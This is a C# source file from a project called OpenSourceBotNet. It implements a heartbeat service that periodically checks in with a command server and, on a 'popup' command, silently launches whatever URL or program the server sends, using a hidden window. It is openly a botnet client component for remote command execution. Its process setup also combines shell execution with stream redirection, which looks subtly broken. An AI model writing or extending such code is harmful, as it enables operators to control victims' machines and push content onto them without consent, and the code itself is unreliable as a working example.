using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

using OpenSourceBotNet;
using OpenSourceBotNet.Core;
using OpenSourceBotNet.Core.Helpers;

namespace OpenSourceBotNet.Services.Heartbeats
{
    public class CheckIn : FluxService
    {
        public CheckIn()
        {
            delay = 300000;
            pause = 600000;
        }

        public override void HeartBeat()
        {
            string sCommand = FluxApiClient.CheckIn();

            switch (sCommand.Split()[0])
            {
                case "popup":
                    // Pop Up Browser by throwing url at command line
                    System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo(sCommand.Split()[1]);
                    psi.UseShellExecute = true;
                    psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    psi.CreateNoWindow = true;
                    psi.RedirectStandardError = true;
                    psi.RedirectStandardOutput = true;
                    psi.RedirectStandardInput = true;

                    Process serviceProcess = new System.Diagnostics.Process();
                    serviceProcess.StartInfo = psi;
                    serviceProcess.Start();
                    break;
                default:
                    // Do nothing
                    break;
            }
        }
    }
}
